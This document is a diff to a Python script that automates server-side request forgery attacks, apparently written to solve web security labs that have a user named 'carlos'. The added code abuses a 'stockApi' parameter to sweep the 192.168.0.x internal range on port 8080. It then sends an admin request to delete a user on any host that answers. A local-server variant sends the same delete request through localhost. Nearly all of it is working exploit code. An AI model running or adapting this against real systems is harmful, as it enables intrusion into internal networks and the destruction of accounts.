@@ -13,18 +13,18 @@ class textcolor:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-class SSRFLocalServer:
+class SSRFVulnerability:
 
     def __init__(self, base_url):
         self.base_url = base_url
 
-    def delete_username(self, url):
+    def local_server(self, url):
         payload = {'stockApi': url}
         headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 
         try:
             response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers)
-            print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: 'http://localhost/admin/delete?username=carlos'"+textcolor.ENDC)
+            print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+url+"'"+textcolor.ENDC)
             return 1
 
         except requests.exceptions.RequestException as e:
@@ -34,35 +34,64 @@ class SSRFLocalServer:
             print(f"\n"+textcolor.DANGER+"Unexpected error occurred:"+textcolor.ENDC)
             print(f"{str(e)}\n")
 
+    def internal_system(self):
+        try:
+            for i in range(1, 256):
+
+                ip = '192.168.0.'+str(i)
+                payload = {'stockApi': 'http://'+ip+':8080'+'/admin'}
+                headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': str(len(payload))}
+
+                response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers)
+
+                print(textcolor.OKCYAN+" [*] Checking "+str(ip)+": "+str(response.status_code)+" HTTP status"+textcolor.ENDC,end="\r")
+
+                if response.status_code == 200:
+                    print(textcolor.OKGREEN+"\n\n"+ip+": 200 HTTP status"+textcolor.ENDC)
+                    payloadURL = 'http://'+ip+':8080'+'/admin/delete?username=carlos'
+                    payload = {'stockApi': payloadURL}
+
+                    try:
+                        print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
+                        response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers, timeout=3)
+                    except requests.exceptions.ConnectTimeout as e:
+                        return 1
+        except:
+            print(textcolor.DANGER+"\nError occured: Check URL and/or Lab properly"+textcolor.ENDC)
+            return 0
+
 def validate_url(url):
     parsed_url = urlparse(url)
     if parsed_url.scheme and parsed_url.netloc:
         return True
     return False
 
-def handle_choice(number, url):
+def handle_choice(number, instance):
 
     if number == 1:
 
-        # Create an instance of SSRFLocalServer with the base URL of the shopping application
-        instanceVar = SSRFLocalServer(url)
-
-        # Call the delete_username method to perform SSRF attack
-        result = instanceVar.delete_username('http://localhost/admin/delete?username=carlos')
-
+        result = instance.local_server('http://localhost/admin/delete?username=carlos')
         if result:
-            print("Username Deleted Successfully\n")
+            print(textcolor.OKGREEN+"Local Server: Username Deleted Successfully\n"+textcolor.ENDC)
 
     elif number == 2:
-        print("Placeholder")
+        
+        result = instance.internal_system()
+        if result:
+            print(textcolor.OKGREEN+"Remote Server: Username Deleted Successfully\n"+textcolor.ENDC)
+
     elif number == 3:
         print("Placeholder")
     else:
-        print("Invalid choice.")
+        print(textcolor.DANGER+"\nInvalid choice."+textcolor.ENDC)
 
 def main():
 
-    url = input("\n"+textcolor.WARNING+"Enter the URL to perform SSRF: "+textcolor.ENDC)
+    try:
+        url = input("\n"+textcolor.WARNING+"Enter the URL to perform SSRF: "+textcolor.ENDC)
+    except:
+        print(textcolor.DANGER+"\nInvalid Input\n"+textcolor.ENDC)
+        return
 
     # Validate the URL
     if not validate_url(url):
@@ -70,12 +99,12 @@ def main():
         return
 
     data = [
-        [textcolor.OKBLUE+"Lab 1"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against the local server"+textcolor.ENDC, ],
-        [textcolor.OKBLUE+"Lab 2"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against another back-end system"+textcolor.ENDC],
-        [textcolor.OKBLUE+"Lab 3"+textcolor.ENDC, textcolor.OKBLUE+"SSRF with blacklist-based input filter"+textcolor.ENDC]
+        [textcolor.OKBLUE+"(1)"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against the local server"+textcolor.ENDC],
+        [textcolor.OKBLUE+"(2)"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against another back-end system"+textcolor.ENDC],
+        [textcolor.OKBLUE+"(3)"+textcolor.ENDC, textcolor.OKBLUE+"SSRF with blacklist-based input filter"+textcolor.ENDC]
     ]
 
-    headers = [textcolor.OKGREEN+"Labs"+textcolor.ENDC,textcolor.OKGREEN+"Title"+textcolor.ENDC, textcolor.OKGREEN+"Description"+textcolor.ENDC]
+    headers = [textcolor.OKGREEN+"Labs"+textcolor.ENDC,textcolor.OKGREEN+"Title"+textcolor.ENDC]
 
     # Generate the table
     table = tabulate(data, headers, tablefmt="pretty")
@@ -83,9 +112,20 @@ def main():
     # Print the table
     print("\n"+table)
 
-    choice = input("\n"+textcolor.WARNING+"Enter your Lab (1-7): "+textcolor.ENDC)
+    try:
+        choice = input("\n"+textcolor.WARNING+"Enter your Lab (1-7): "+textcolor.ENDC)
+        #choice = 2
+    except:
+        print(textcolor.DANGER+"\nInvalid Input\n"+textcolor.ENDC)
+        return
 
-    handle_choice(int(choice), url)
+    # Create an instance of SSRFVulnerability with the base URL of the shopping application
+    instanceVar = SSRFVulnerability(url)
+
+    try:
+        handle_choice(int(choice), instanceVar)
+    except:
+        print(textcolor.DANGER+"\nInvalid Input\n"+textcolor.ENDC)
 
 if __name__ == '__main__':
     main()
